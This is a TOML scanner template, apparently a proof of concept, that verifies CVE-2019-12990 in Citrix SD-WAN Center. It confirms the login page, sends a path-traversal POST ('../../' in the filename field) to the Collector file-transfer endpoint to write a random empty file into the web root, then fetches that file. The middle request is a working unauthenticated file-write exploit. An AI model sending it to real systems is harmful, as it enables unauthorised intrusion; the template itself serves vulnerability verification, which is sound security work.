[info]
author = "ave"
description = "通过三步HTTP请求验证Citrix SD-WAN Center的目录遍历漏洞：先获取登录页面确认目标存在，再向Collector控制器发送特制POST请求利用路径遍历写入文件，最后验证文件是否成功写入。"
id = "POC-AVE-2019-0062"
name = "Citrix SD-WAN Center 目录遍历漏洞 PoC"
severity = "critical"
tags = ["ave-2019-0062"]
vuln_id = [
    "CVE-2019-12990",
    "AVE-2019-0062",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/login"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<title>Citrix SD-WAN</title>"]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/Collector/appliancesettings/applianceSettingsFileTransfer"
protocol = "http"

[poc.requests.body]
content = "filename=../../../../../../home/talariuser/www/app/webroot/files/{{randstr}}&filedata="
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/talari/app/files/{{randstr}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
